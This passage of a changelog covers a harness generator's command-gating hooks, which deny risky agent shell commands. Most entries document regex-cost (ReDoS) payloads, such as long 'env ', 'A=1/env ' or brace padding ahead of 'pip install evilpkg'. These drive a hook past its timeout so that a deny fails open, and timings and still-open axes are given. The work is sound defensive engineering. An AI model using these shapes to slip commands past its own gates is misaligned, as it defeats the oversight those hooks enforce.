# Changelog — Bootstrap Protocol implementation

## 2.7.4 → 2.8.0 — the LIT literature fold: nine additive items, one priming change (2026-08-14)

**MINOR — it qualifies on both counts, the v2.7.0 shape.** Adopts all ten items
of the LIT r2 proposal
(`docs/Bootstrap-Protocol-Improvement-Proposal-LIT-2026-08-r2.md`, the
2026-08-11 adversarial-review resolutions PAR-01..12 already folded; all six
rejections upheld and recorded there). Applied changelog-first per the
v2.3.0 / v2.4.0 doc-fold discipline; every PRD edit is tagged inline
`[LIT-nn]`. Owner decisions at adoption: Tier 3 (LIT-06/LIT-02) adopted rather
than deferred to the Proposed-revisions appendix; LIT-07 included rather than
deferred one cycle; one MINOR fold.

**Count 1 — new operator-facing normative surface (the v2.3.0/v2.4.0 additive
precedent).** Nine additive items:

- **[LIT-01]** No-lossy-rewrite preservation invariant — any rewrite of a
  memory artifact preserves every fact, flag, and citation (prose may drop);
  lands in the Phase 7 progress/learnings discipline, the emitted `/checkpoint`
  body, and the emitted progress-template. One new Assumption-Ledger row.
- **[LIT-04]** Lexical-first retrieval guardrail — exact/governance recall
  uses lexical or pointer retrieval, never single-vector semantic search
  alone; multi-vector/hybrid preferred if a vector layer is ever chosen
  (PAR-09 upgrade adopted). Phase 6.5 plus the emitted `steering/tools.md`.
- **[LIT-05]** Tool-harness store-shaping annotation — changing search/edit
  tooling is a store-affecting decision, recorded like a model change; see-also
  at [W-1] (deliberately demoted to see-also: gate fail-open, not store shape).
- **[LIT-10]** Small-model single-step invariant — Haiku-tier components get
  single-step, schema-constrained jobs only; elevates existing behavior
  (structured `{verdict, reason}`, iteration-summary enforcement,
  retry-once-then-halt) to a stated invariant. Labeled as this proposal's
  synthesis (PAR-07), not P3's statement.
- **[LIT-03]** Verbatim-vs-distilled retention routing — verbatim artifacts
  (trajectories, raw checkpoints) serve strong consumers; distilled artifacts
  (`decisions.md`, `learnings/`, synopses) serve weak/cheap consumers; never
  feed raw trajectories to the judge tier. PRD-only.
- **[LIT-08]** Four-metric calibration-ledger fields — outcome, tokens,
  iterations-vs-cap, format-validity per entry, with PAR-12 field-existence
  precision (tokens and format-validity are goal-mode-recordable; loop-mode
  rows say trajectory-derived or N/A) and the PAR-05 TEL-01 positioning (one
  evidence channel: telemetry-on operators query instead of transcribe). Also
  extends the retrofit mode-selection seed table (additive columns only —
  no emitted tool parses that seed table — `bin/trust-ramp` reads only its
  own `.claude/trust-ramp.md` ledger, whose absorb path preserves unknown
  `**Field:**` lines; one named residual: the new `**Outcome:**` field's
  vocabulary is broader than trust-ramp's own outcome enum, relevant only if
  a ledger later absorbs mode-selection blocks, not a current conflict).
- **[LIT-09]** Complexity-downgrade rule for the calibration review — each
  scaffold layer must pay for itself in the ledger, judged via the
  *Felt right? = "yes but the judge was noisy"* answer, recommendations only.
  **Surface correction against the proposal's "Affects" line:** no
  calibration-review skill exists as an emitted artifact (the PRD frames it as
  operator-added), so the rule lands in the Calibration-mechanism prose and
  the Companion — no template edit, no digest movement.
- **[LIT-06]** Golden-task regression harness — 2–3 known-good, loop-eligible,
  trivially revertible tasks seeded from the Phase 9 smokes, re-run through
  each *enabled* autonomous mode on any Assumption-Ledger trigger, own
  iteration cap 2–3, stated worst-case cost (PAR-06). Converts the ledger's
  fail-loud notice into a measurement without overclaiming current automation.
- **[LIT-02]** Reversible, eval-gated memory consolidation — operator-run,
  targets `.claude/learnings/` only (`specs/INDEX.md` is the task board and is
  never reorganized, PAR-04); git commit/tag is the snapshot so nothing parks
  where the 7-day purge or the GR2-02 pruning obligation reaches; parallel
  copy, LIT-01 diff, LIT-06 golden run on both stores, ties promote (stated),
  every promotion reversible.

**Count 2 — one behavioral priming change [LIT-07] (the v2.7.0
behavior-change-is-still-MINOR precedent).** `loop_max_iterations` is redacted
from the primed task-definition slice — Phase 9.5 step 3 always, Phase 9.6
only for eligible-for-both tasks (PAR-11) — and the **adopted-B-1 binding
comment contract gains a fifth enumerated item** (four → five): the
operator-completed loop filters the field from the primed copy and primes the
sentence *"Don't ration or count iterations; the harness manages all budgets
and will end the loop when appropriate."* (PAR-03 rewording; the r1 sentence
was not literally true and is not restored). The field **stays in the
task-definition schema and the committed task file** — a priming-slice change,
not a schema change; enforcement stays wrapper-only. Deliberate-absence
comment blocks (W-1 pattern) land in the emitted `loop-config.md` /
`goal-config.md` and a new BINDING comment block in the per-task wrapper
skeleton (the skeleton previously carried no priming-assembly comment at
all — the PRD phase text was the only home). Honest scope (PAR-01b): this
reduces prompt *salience*; the cap remains workspace-readable in the committed
task file and configs. One new Assumption-Ledger row; a model generation that
plans *better* with a known budget flips this default.

**Migration [LIT-07].** Operators edit their completed `loop.sh` /
`goal-loop.sh` priming assembly to apply the filter and add the priming
sentence. **Unedited legacy installs keep the old priming behavior** — the cap
remains primed and nothing else changes. Re-running the installer will not
perform this edit: operator-completed wrappers are hand-edited files, and the
hand-edit digest guard skips them by design. The Companion carries the same
note under Migration notes.

**Seam impact: none.** `SEAM-CONTRACT-v2-0-0.md` §8.4: no tier membership
change, no provenance-marker or synthesize-file-contract change, no shared
sentinel change, no CLI entry point or contract-level flag, no §4.1/§5 table
change, no `binds` change. **The fold's own diff — measured against pre-fold
`main`, the tree it landed on — touches no gate internals:** it moves comment
blocks, steering prose, ledger rows, and the version stamp only, so the
release criterion inherited from 2.7.0 holds for the fold with the
**"previously denied, now allowed" set empty by construction** (verified by
rendering both trees' emissions and diffing per path). The full release delta
against the **v2.7.4 tag** additionally contains the gate-corrective work
named under Release identity below; that work ships here as it landed, its
verdict movement recorded at its own landing (closed bypasses and added
refusal paths per its freeze-exception records), not re-measured by this
entry. `seam_version` stays 2.0.0.

**Open proposals untouched.** B-2..B-7 and GR2-03b/04/05/06/07 remain open
exactly as recorded. **[LIT-07] amends adopted-B-1 text** (the Phase 9.5
deliverable contract's binding comment enumeration, four → five items) — B-1
was ADOPTED at 2.2.0; no open proposal's text moves.

**Release identity — everything merged since the v2.7.4 tag ships here, not
only the fold.** (a) The five formerly-`Unreleased` entries below
(2026-08-08/09, retitled *Post-2.7.4, shipped in 2.8.0*): item 1 and its
follow-ups (double-quoted command-substitution class, invoker-wrapped
substitution, D20 driver, comment-aware walk) and the G-6 close with the two
emission paths pinned. (b) The gate-corrective work of 2026-08-10..13 that
landed with freeze-exception records (nos. 51–61, in the golden digest
comment stacks of `tests/test_greenfield_golden.py` / `tests/test_retrofit.py`)
but **no changelog entries of its own — a recording debt this entry settles
by naming it**: the B3 flat-budget re-land (PR #64), B4 (front-window
substitution scan), X-36y, X-45, X-46 (control-whitespace budget lift),
X-47, X-50 (norm_cmd two-level accumulation, prefix-sampling fix), and the
X-51 cost guard (a `PreToolUse` hook cancelled at its timeout FAILS OPEN, so
commands too expensive to gate are now refused up front — the declared
timeout is the attacker's budget, not a safety net). (c) The X-52 cost-term
line — **PR #65** (`fix/x52-work-counter`, merged 053a367, freeze exceptions
62–66): three quadratic loops removed from the substitution walk and the
`_lastw` memo bypass closed (the differential grew 4092 → 4104 rows to carry
it) — and its documentation line, **PR #66** (`docs/post-x52-readiness-and-kb`,
merged 3af0c11 mid-fold, exception 67): the fail-open-claim retraction swept
through every emitted comment, the backlog re-sorted by threat model, and
`docs/threat-model.md` drafted — recorded in the freeze-exception stacks and
the backlog, with no changelog entries of their own either. **[Corrected
2026-08-14: this clause originally attributed the whole X-52 line to PR #66;
the code work is #65, the docs are #66. The e6f279b merge-commit message
repeats the error and is immutable — this entry is the record.]** Per all
those records the class is closed bypasses, added refusal paths, cost-bound
fixes, and maintainer-side tests/docs; no new configuration keys —
PATCH-grade on their own; the MINOR tier is carried by the fold above.

**Freeze exception 68.** All five aggregate golden digests
(`test_greenfield_golden.py` default / full_autonomous / design_steering,
`test_retrofit.py` service / agent) plus `EXPECTED_TELEMETRY_BODY` re-baseline
once at the version bump, and again on the post-merge tree after PR #66
landed mid-fold: content movement is the LIT comment/prose additions
enumerated above, the renumbered PRD citation carried in the emitted
iteration-summary-enforcement hook, and the `_generatedBy` version stamp. No
hook logic, gate body, or dispatch line moves in the fold's own diff. **Why
68:** the fold first took 62, then 65, and both were consumed out from under
it by the X-52 line (62–66 with PR #65, 67 with PR #66, dated
2026-08-12/13); 68 is the first number free on the merged tree.

Suite 9,462 → **9,668 checks**, 0 failed; 25 suites (the delta includes the
X-52 line's unrecorded additions — the 4092 → 4104 differential rows among
them — landing under this release identity).

## Post-2.8.0 — the install-head loop stops evaluating `HEAD` once per completer (2026-08-28)

**No version bump** (fix, not surface; freeze exception **77**).
`x54-completer-cost`, the completer member of the X-54 cost class.

**The defect.** The install-head candidate loop evaluated the `HEAD` regex **once
per completer token**, and bash recompiles an anchored ERE on every `[[ =~ ]]` —
fixed cost a shorter subject cannot reduce. **The number of evaluations is the
cost, not their subject.** Single-character completer keys make a cap-legal
payload that is entirely attacker-supplied with **zero jump targets**.

**The fix.** The loop only **collects** now: reduced words into `_cparts`, never
cleared, plus each completer's element count and token index. Then one join,
**one** `HEAD` test, and a **binary search** over the marks. `HEAD` is anchored
`^` and open at the end `( |$)`, so "matches the first k words" is monotone in k
and the forward walk was a linear scan of a sorted array.

**Measured on the emitted hooks**, this tree against `origin/main`, idle, one
case at a time: completer `x`×40,951 goes **106.51 s, killed at the 60 s
ceiling → 5.12 s deny**, against a non-completer control at the identical byte
count that reads 4.55 s → 4.50 s. **That was a live fail-open**: past the 60 s
ceiling the emitted `settings.json` declares, a PreToolUse hook is cancelled and
only exit 2 blocks, so the deny became an allow.

**Behaviour unchanged, checked rather than argued:** 11,000 differential commands
on `(rc, stderr)`, 0 diffs; a 190,494-case census against the emitted artifact's
own `HEAD`, 0 violations. Action counts unchanged at 57 / 69 / 59 and 79 / 93.

**RETRACTED, 2026-08-31 — the residual above was NOT harmless and the disclosure
was false.** It read: *"the loop lost its early `break`, so a segment that
carries a head walks all its tokens. Answers unchanged; only cost moves, bounded
by `_CMD_MAXLEN`."* Under the production ceiling **cost crossing IS an answer
change**, which is the one thing this entry is about. Measured on the emitted
hook, `pip install evil ` + `x `×34,000 (68,017 B, 0 jump targets, deny at stake
— it denies unpadded in 0.03 s): **rc 2 in 57.7 s on `8c2fc35`, rc 124 on
`8cc107f`** — a DENY the parent reached, cancelled, and only exit 2 blocks. The
fix closed one fail-open and opened another. **Closed by the follow-up below;
the entry above is left standing per this file's append-only rule.**

## Post-2.8.0 — the install-head loop can stop early again (2026-08-31)

**No version bump** (fix, not surface; freeze exception **77**, the same
exception). `x54-head-bearing-fail-open`, a regression from the entry above.

**The defect.** Removing the per-completer `HEAD` test fixed head-LESS padding
and broke head-BEARING padding: the loop no longer stopped at the head, so it
walked every token and recorded a mark for each — work the original loop skipped.
On a cap-legal shape that pushed a deny the parent reached past the 60 s ceiling.

**The fix, and it is one counter.** The loop probes `HEAD` at the **1st, 2nd,
4th, 8th …** completer. That is O(log m) evaluations — the same order the binary
search after it already pays, **not** the ~41,000 the previous entry removed — so
a head near the front stops the walk almost at once and head-less padding keeps
its bound. **Both fail-opens are closed by the same counter.**

**Measured under the production 60 s ceiling**, emitted hooks, one case at a
time: head-bearing `pip install evil ` + `x `×34,000 **rc 124 → rc 2 in 57.5 s**;
and the previous entry's win is kept — head-less `x `×40,951 + `; pip install
evil` stays **rc 2 in 4.5 s**. Unpadded control denies in 0.03 s.

**No behavioural row guards this yet, deliberately.** The crossing sits about 9 s
apart on a ~57 s baseline dominated by the still-open **argument-scanner** member,
so a wall-clock row would have ~4% headroom and would flake — the `#50 T8`
failure this suite has already paid for once. A source-shape pin in
`tests/test_composition.py` guards the probe against deletion, and the
behavioural row is **owed** when `x54-arg-scanner-quadratic-and-fork` closes.

**X-54 stays open, and its row in `docs/deferred-backlog.md` is the single point
of truth for what this closes and what it does not** — the wrapper member and an
argument-scanner member both remain. This entry deliberately does not restate
that row: a fact repeated on ten surfaces goes stale on nine of them.

## Post-2.8.0 — the prefix run stops having two readings of one token (2026-08-24)

**No version bump** (fix, not surface; freeze exception **75**).
`prefix-run-assignment-wrapper-overlap`, the item PR #87 named as the one that
had to come first.

**The defect.** `A=1/env ` matched `prefix_run`'s assignment arm **and** its
path-prefixed wrapper arm at once, so the boundary between `nonabs*` and the
trailing group fell anywhere in a run of such tokens and a failing match walked
every one — quadratic in the token count at a fixed 8 bytes per token, against a
gate declaring 60 s. **`2>x/env ` did the identical thing on the glued redirect
arm.** That second arm was on no queue row and in no comment; a step-3 lens
found it by sweeping the arms instead of reading the one the record names, and
the first candidate for this item — which closed only the assignment arm —
measured **14.01 s** on it where the parent measures 14.03 s. Both arms are
closed here, sharing one copy of the complement. The **spaced** redirect form
carries no wrapper reading and is untouched.

**The accepted language is unchanged, decided rather than sampled.** The exact
ERE/Python → NFA → product-BFS procedure, both dialects, unbounded in string
length, over `prefix_run` **and** `pipe_to_shell_regex`: four rows, all
equivalent, each selfchecked against Python's own `re`. Two-sided: the opposite
repair — narrowing the *wrapper* arm — is caught with witness `/env `, and that
direction is the fail-open one, because it loses
`"A"=1/env -i pip install evilpkg`, which bash really runs (a quoted NAME is not
an assignment) and which this suite denies today. 370 commands × 7 gates =
**2,590 verdicts, 331 of them deny, zero differences** against the parent.

**Measured on the emitted object**, min-of-3 `process_time`, SDK
`dependency-gate`, both trees in one run, zero jump bytes and `_cost_guard`
PASS and `deny` on every row:

| payload | bytes | parent | here |
|---|---|---|---|
| `A=1/env `×2700 | 21,646 | 14.0645 s | **0.0464 s** |
| `A=1/env `×5400 | 43,246 | 56.0672 s | **0.0859 s** |
| `2>x/env `×2700 | 21,646 | 14.0314 s | **0.0476 s** |

Exponents go **2.0 → 0.9** on both axes: an order change, not a constant.

**It is not Pareto**, and a table of wins alone would read as if it were. On
payloads it does not help the longer pattern costs a little: the glued-brace
axis is **1.02×** of the parent, and the non-overlapping control `2>x/foo `×2700
goes **0.0304 → 0.0368 s**.

**The shell substrate — cost only.** Through the emitted hook, wall clock,
min of 2, parent → here: `A=1/env `×2700 at 21,646 B, 0.793 → 0.791 s;
`2>x/env `×2700 at 21,646 B, 2.102 → 2.109 s; `{`×20000 at 20,047 B,
1.009 → 1.016 s. All three unchanged. The shell's `CMD_PFX` did change.
**No claim is made here about shell verdict coverage.** This item ran no
parent-vs-HEAD sweep of shell verdicts, and two attempts to characterise what
the suite does cover were both wrong, in opposite directions — so the third
attempt is to state only what was measured.

**No null alternatives.** The generated complement spells "stopping here is
allowed" as `(...)?`, never `(...|)`. POSIX leaves a null alternative undefined
and a strictly conforming engine rejects the whole pattern — on which every
emitted `[[ =~ ]]` returns 2 and the surrounding `if` reads it as false, i.e.
the gate goes silently permissive. glibc accepts it, so this box cannot see it;
`ugrep` rejects it and was the control.

Action counts unchanged at **57 / 69 / 59** and **79 / 93**, zero files added or
removed, verified before the re-baseline — a count move would have been E5, not
a silent digest.

**The second commit — the left edge.** `prefix_run`'s wrapper path arm and
`interpreter_word`'s two scans may no longer *begin* with a character the
preceding `[({] *` arm has already absorbed, so an attempt at a position inside
a glued brace run is O(1) instead of a re-read of the whole remaining token.
PR #87 built this, proved it equivalent, and dropped it — it cost 1.09–1.12× on
the `A=1/env ` axis and moved that deny across the 60 s ceiling. With the first
commit making that axis linear, the same constant lands on a linear axis
instead of on a crossing (0.0859 → 0.0886 s at 43,246 B). PR #87 reached the
same ordering, though it stopped short of committing to the left edge at all.
Equivalence was decided again rather than inherited, over `prefix_run` **and**
`pipe_to_shell_regex`, against this tree's spelling of the arms.

| glued braces | bytes | first commit | both |
|---|---|---|---|
| `{`×5000 | 5,047 | 1.4847 s | **0.2307 s** |
| `{`×10000 | 10,047 | 5.8487 s | **0.8761 s** |
| `{`×20000 | 20,047 | 23.3415 s | **3.4078 s** |
| `{`×81872 | 81,919 | 391.4576 s | **56.2891 s** |

The 81,919 B row is one byte under `_CMD_MAXLEN`; its parent figure is a single
reading (a 150 s cap stopped it after the first rep) and the 56.2891 s is
min-of-3.

**That is a live fail-open turned into a pass, and not much more.** The axis is
**still quadratic** — exponents 1.94 / 1.97 — so 6.95× is a constant, the margin
at the guard's own maximum is **6.2%**, and it is min-of-3 CPU time against a
wall-clock deadline, which is not the same quantity. What remains is
`_INSTALL_HEAD`. No per-pattern share for this tree is published.

**What neither commit does.** `_INSTALL_TAIL`'s ten un-narrowed path scans are
what the brace axis is now made of. Narrowing them is **not**
language-preserving — it deletes `python -m {x/pip install evil` — and they are
`install-tail-path-scan-quadratic`, a filed row of its own.

## Post-2.8.0 — `_ckey`'s glue strip stops rebuilding the word (2026-08-22)

**No version bump** (fix, not surface; freeze exception **74**). What is left of
`prefix-run-cost-residuals-2` after its left-edge half was dropped — see the
closing note below, which is the more useful half of this entry.

**The defect.** `_ckey` takes the leading `cmdpos.COMPLETER_GLUE` off a word so
the completer key can be matched. It did that one character at a time with
`_t="${_t#?}"`, and each of those rebuilds the WHOLE remainder, so stripping n
glue bytes cost O(n^2). `%%` now takes the glue run in a single expansion and
the remainder is taken by OFFSET — `${_t#"$_g"}` would itself be quadratic in
`$_g`, so the offset form is the one that pays. Plus the X-45 guard on
`${1##*/}`, which is quadratic on a slash-free word: ask whether the word has a
slash first, exactly as the word walk does.

**SHELL ONLY, and that is the whole blast radius.** The emitted
`.claude/sdk_gates/gates.py` is byte-identical to the parent; `lib/cmdpos.py`
and `lib/sdk_gates_template.py` are untouched. One hook body moves,
`.claude/hooks/dependency-gate.sh`, plus the two files that digest it. Action
counts unchanged at 57 / 69 / 59 and 79 / 93.

**Measured on the emitted hooks**, min of 2, both trees in the same run:
`?`x16000 with no downloader and no pipe **4.871 s → 0.323 s** (allow); a glued
brace run at 81,919 B **131.196 s → 16.431 s** (deny); `{`x81870 +
`; pip install evilpkg` **120.588 s → 6.149 s** (deny). **The last two were live
fail-opens on this substrate** — both past the 60 s ceiling the emitted
`settings.json` declares for this hook, and past it a `PreToolUse` hook is
cancelled and only exit 2 blocks. The second is PR #84's own filed payload.

**It is a constant-factor win, not an order change**, and the step-4 row says so:
through the emitted hook the landed form still rises, exponents 1.05 / 1.40 /
1.68 over 4k → 8k → 16k → 32k against the parent's 1.80 / 1.98 / 1.95, because
`${_t%%[!({:?]*}` is itself quadratic. Behaviour is unchanged and checked rather
than argued: the old, candidate and landed spellings agree on 196 alphabet cases
with 0 disagreements, and the emitted body agrees with `cmdpos.completer_key` on
every glue form in the `#45 D1` census.

**WHAT WAS DROPPED, AND WHY IT IS THE USEFUL PART OF THIS ENTRY.** This item also
carried a left-edge regex narrowing that closed the SDK's own glued-brace axis.
It was dropped: it cost 1.09–1.12x on the deny-carrying `A=1/env ` axis and moved
that deny across the same 60 s ceiling, and **four candidate spellings were
built, emitted and measured without recovering it** — factoring the shared suffix
was worse, disjoint-by-first-character was neutral, a zero-width lookahead
halved it and was still over the ceiling, and a one-alternative narrowing was
worse and narrower. Constraining a left edge costs whatever spelling is used, and
on a quadratic axis the constant multiplies. **Shaving a constant off a quadratic
does not move a crossing.** The SDK axis and the `A=1/env ` axis share one cause —
the assignment arm and the path-prefixed wrapper arm both matching `A=1/env `, so
the handoff at the star is free — and both go to
`prefix-run-assignment-wrapper-overlap`, which removes it rather than bounding it.

## Post-2.8.0 — the prefix run stops re-parsing its own input (2026-08-20)

**No version bump** (fix, not surface; freeze exception **73**). The direct
continuation of the 2026-08-19 entry above, which closed the token-count axis
and said in its own words that it did not close the class.

**The defect, and it is a different one from 72's.** Three arms accepted the
same bytes along more than one parse, so a **failing** match walked every parse:
the redirect arm let `[<>]+` and its target consume the same `<`/`>` characters
(2x per token); the trailing `([({] *)*` shared `{ ` with the word run before it
while `A=1/env ` matched the assignment arm **and** the path-prefixed wrapper arm
at once (~k*m^2); and `_GIT_VERB_TMPL`'s flag star let a `-C` token match both of
its arms (Fibonacci-many parses, ~1.62x per token).

**Measured on the emitted artifacts.** `curl … | ` + `2>>o ` x24 is **141 bytes
with zero jump bytes** and took the emitted `dependency-gate` **110.22 s CPU**
against the **60 s** it declares — and it is **allow/allow**, so it spends the
whole budget on a command both substrates permit. `git ` + `-C ` x40 is **127
bytes** and crosses the ceiling on `spec-gate-commit`, which declares no timeout
on **either** substrate. `_cost_guard` measures length and jump density and can
see neither term.

**The fix removes duplicate parses and not one string.** Proved by an exact
ERE/Python → NFA → product-BFS decision procedure over both dialects, unbounded
in string length, two-sided calibrated against four deliberately broken variants.

**The first spelling of the git fix was a bypass and the behavioural suites could
not see it.** `(?:\s+-[Cc]\s+[^-\s]\S*|\s+-\S+)*` drops `git -C - commit` — a
real invocation — and three gates stop applying, turning deny into allow, while
`test_substrate_differential` (4178), `test_composition` (147) and
`test_hook_behavior` (384) were **all green**. The landed spelling admits the
lone `-` back; five rows now pin it. **Both encodings of that star move** — it is
written twice, in `lib/sdk_gates_template.py` and hand-written in
`lib/templates.py`, and has no `cmdpos` renderer.

**What is pinned, and it is pinned rather than asserted:** four cost rows and
fifteen language rows in `tests/test_substrate_differential.py`; a spaced-brace
guard and its own calibration in `tests/test_composition.py`; and a **deletion
calibration** the cost block never had — the emitted pattern with the
substitution undone must be dramatically slower on the same payload, so the rows
cannot be green for a reason other than the fix.

**Freeze exception 73.** All five golden and retrofit fixtures move, because
`prefix_run` renders into the shared header. **Action counts unchanged** at
57 / 69 / 59 greenfield and 79 / 93 retrofit, zero files added or removed,
verified before the re-baseline — so a count move would have been E5 rather than
a silent digest.

**What this does NOT do: close the cost class — and "expensive" is the wrong
word for what survives.** Three axes are untouched, all measured on this tree
and identical at the parent:

* **glued braces.** `{` x19200 is ~21 s SDK / ~7 s shell. At the largest length
  `_cost_guard` permits it is a **live fail-open on both substrates**:
  `{` x81870 + an install tail is 81,891 bytes with **zero jump bytes**, SDK
  **61.56 s** and emitted shell hook **119.32 s**, both carrying a deny, both
  past their 60 s ceiling.
* **the `A=1/env ` arm overlap** — a k factor this repair does not remove.
  40,984 bytes: 53.0 s at the parent, 51.2 s here, quadratic, allow/allow.
* **the downloader alternation against `[^;&]*`**, found during this item's
  review: quadratic on **both** substrates and reachable by an ordinary `wget`
  with many URLs.

None is an ambiguity to factor out; each needs a bound, and a bound is a
language change. The first two are already described in
`.claude/readiness-queue.md`; **the third is not filed anywhere yet** — the
queue row is rewritten at closeout, and until then this paragraph is its only
record.

**AND IT IS NOT PARETO.** The redirect arm now tests two `[<>]` classes per
`[0-9]*` step, so digit-run payloads are slower: measured end to end on the
emitted `dependency-gate`, 4,047 / 16,047 / 40,047 bytes cost **1.09x / 1.10x /
1.15x**, deny/deny throughout. Linear, ~+6 ms at 40 KB — recorded because a
table of wins alone would read as if there were none.

## Post-2.8.0 — the SDK prefix-run ReDoS: the token-count cost axis (2026-08-19)

**No version bump** (fix, not surface; freeze exception **72**). A live fail-open
on `main`, found 2026-08-16 while designing X-37 attempt 2 and unrelated to X-37.

**The defect.** `cmdpos.prefix_run()` was a star whose wrapper arm was ambiguous
with itself, so a **failing** match was exponential. `curl … | ` + `env ` x22 +
`zzz ; pip install evilpkg` is **134 bytes with zero jump bytes** and took the
emitted `dependency-gate` **77.56 s CPU** against the **60 s** it declares in
`_GATE_TIMEOUTS`; a cancelled hook exits 124/137/143 and only exit 2 blocks, so
the command proceeded unadjudicated. The shell denied the same string in 0.03 s.
`_cost_guard` measures length and jump density and can see neither term.

**The fix.** At most one absorbing group: the non-wrapper arms lead as `nonabs*`,
the wrapper arm becomes a single optional trailing group carrying the word run
and the trailing brace star. Plain POSIX ERE, one source for both substrates.

**The language is unchanged, decided rather than sampled.** An exact ERE/Python
equivalence procedure explored the full product graph in both dialects with zero
accept-disagreements, two-sided calibrated against deliberately broken variants,
and corroborated independently at review by a second decider plus 648 real
command shapes through both emitted substrates of both trees.

**What is pinned, and it is pinned rather than asserted:** four cost rows in
`tests/test_substrate_differential.py` (red before, green after, shell control on
each); the brace-after-wrapper language guard and the multi-wrapper invariant in
`tests/test_composition.py`, both calibrated red against the rejected candidate
first.

**Freeze exception 72.** Every emitted hook body and `gates.py` move, because
`prefix_run` renders into the shared header. **Action counts unchanged** at
57 / 69 / 59 greenfield and 79 / 93 retrofit, zero files added or removed,
verified before the re-baseline — so a count move would have been E5 rather than
a silent digest.

**What this does NOT do: close the cost class.** It closes the token-count axis
only. Other superlinear shapes reach this regex and its neighbours and survive
this change; they are tracked in `.claude/readiness-queue.md` as their own item
and are deliberately **not** enumerated here, because an unchecked count in a
record is how this entry's first draft went wrong. **The readiness verdict does
not move.**

## Post-2.8.0 — the PRD filename catches up with its own contents (2026-08-14)

**`Bootstrap-Protocol-v2-6-0.md` and `Bootstrap-Protocol-Companion-v2-6-0.md`
are now `-v2-8-0`.** This is a filename correction, not a version bump: both
files have carried `**Version:** 2.8.0` and the LIT-fold header since the
release, which updated their CONTENTS and never renamed them. The result was a
working PRD that self-identified as 2.8.0 under a 2.6.0 name — and
`lib/templates.py:3121` saying **"(`Bootstrap-Protocol-v2-6-0.md`, 2.8.0)"** in
a single breath. **The rename is the operator's, made outside this session;
this entry records and completes it rather than re-deciding it.**

Done with `git mv`, so the content is byte-identical and git records a rename
rather than a delete-plus-add — no history is lost, and `git log --follow`
still reaches the 2.0.0-era commits. **No 2.6.0 snapshot is destroyed, because
none existed to destroy:** 2.6.1 through 2.8.0 were all edited into this same
file in place, which is exactly the confusion the rename ends. The genuinely
frozen snapshots (`v2-0-0`, `v2-2-0`, `v2-4-0`, `v2-5-0`) are untouched.

**All 61 references across 17 tracked files repointed**, verified by
`git grep -c` returning nothing for the old names. Three suites had been
opening the file by its literal path and CRASHED before this pass —
`test_doc_citations`, `test_installer`, `test_worktree_command_compat` — which
is how a rename this wide announces itself. Historical entries above and in
`.claude/trust-ramp.md` now name the file as it is called today; they refer to
the same object, and what they CLAIMED is untouched.

**Freeze exception 70.** All five aggregate golden digests re-baseline. Emitted
bytes move only where a template cites the PRD by filename —
`steering/assumption-ledger.md` in every fixture, plus `loop.sh`,
`goal-config.md` and `goal-loop.sh` in the autonomous ones. No executable line,
no gate body, no dispatch line, no action-count change (57 / 69 / 59, service
79 / agent 93).

**The policy citation moved again with this entry — `882 → 922`, its twelfth
value and eleventh move**, renumbered in this same commit per the standing
rule. Two entries in a row have now moved it, which is the argument for
anchoring that citation to a heading rather than a line; filed as a note here
rather than done, because changing the citation FORM is a change to
`test_doc_citations`'s contract and wants its own pass.

## Post-2.8.0 — the head-class cost measurement, and the emitted figure it corrects (2026-08-14)

**The measurement that was owed since the X-52 line is run, and it is the
PRECONDITION the autonomous-mode work was waiting on.** It was declared owed in
`docs/deferred-backlog.md` (X-54), the security KB, `docs/production-readiness.md`
and the work order, and claimed in none of them. Run on `f9c2bb2`; **the figure
binds `053a367` and the v2.8.0 tag as well, and the warrant is the artifact
that was actually TIMED**: emitted `dependency-gate.sh` is byte-identical
comment-stripped across `053a367..f9c2bb2` (raw bytes differ — 225738 vs
225620 — the stripped digest does not), verified by rendering both trees.
(Emitted `gates.py` is separately AST-identical at
`f71ec4a81bae9f826e39d06f361dac5f`, but that is the SDK artifact and is **not**
what this pass measured; citing it here would be a warrant for the wrong
object.) `dependency-gate`, **80001–80004 B** / 4000 jumps — the byte count
varies by head length, the jump count does not — two reps per head, serial at
width 1, each hook in its own session with the whole process group killed on
timeout, and no row started while the 1-minute load average was above 1.50 —
the load is stamped per row.

* **Wrapper heads, all PAST the 60 s ceiling at ~2.6x:** `sudo`
  **156.75–157.19 s**, `env` **157.84–159.88 s**, `nice` **156.28–156.92 s**.
* **Transparent heads, flat and 4.9x UNDER it:** `!` 12.10–12.20 s, `{`
  12.20–12.25 s, `-x` 12.25–12.30 s, `echo` 12.10–12.20 s.
* Reps agree to 1.01x; the two classes separate by ~13x.

**`nice` widens the class and had never been measured.** Membership recorded
anywhere was two — `sudo` in X-54's row, `env` in the trust ramp — and it is at
least three. X-54's rule ("only a `wrap` head reaches this") is CONFIRMED; its
example list was short, which is a different thing from wrong.

**The work order's own recipe for the shape was wrong, and is corrected rather
than quietly re-derived.** It gave `head + " " + " ".join("'r%d'" % i for i in
range(2000))` and called it "~80 KB, 4000 jumps". That literal is **14894 B** at
the same 4000 jumps — the jump count right, the length **5.4x short** — because
the quoted runs must be PADDED toward `_CMD_MAXLEN` to reach the 80004 B X-54
records. Measuring the literal would have measured a 15 KB command and returned
a reassuring number for the row whose entire claim is that 80 KB is reachable
under both caps.

**THIS DOES NOT CLOSE X-54, AND THE ROW STAYS `open`. It also does not
reproduce the bypass, and an earlier draft of this entry said it did.** Every
row returned rc 0 ALLOW — but the measured payload carries **no install verb**,
so ALLOW is the CORRECT verdict at any speed and no deny was ever at stake.
What crossed the ceiling is the COST; the fail-open X-54 describes needs a
shape that would otherwise DENY, carried in the same padding, and that is not
what was run here. Stating it the other way round would have claimed a
reproduced bypass on the strength of a benign command. What the pass buys is a
SIZE, not a fix and not a proof. X-55's `>240 s KILLED` is not re-run and stays
owed.

**Freeze exception 69.** All five aggregate golden digests
(`test_greenfield_golden.py` default / full_autonomous / design_steering,
`test_retrofit.py` service / agent) re-baseline for a **comment-only** change in
the `_read_cmd` preamble that every emitted hook body embeds — which is why one
edit moves five digests. **The moved set is counted per fixture, not from a
probe install:** 11 hook bodies in `default`, 15 in `full_autonomous`, 11 in
`design_steering` (37 across the three), 11 and 15 in retrofit service/agent;
no other artifact moves in any fixture. (An earlier draft wrote "all 13 emitted
hooks" — 13 is the hook count of an ad-hoc probe config, never a fixture count,
and `test_greenfield_golden.py` already carried two corrections of exactly that
substitution. It is the same class of error as citing the wrong artifact: a
number that is real, but of the wrong thing.)

The preamble asserted **in the present tense** that `sudo` + 2000 runs "is
still 150.95 s here", against "a main that times out above 1200 s". Both halves
were wrong by referent rather than arithmetic: 150.95 s was the PRE-memo
figure while the same preamble carried the post-memo 159.52 s **over 1,300
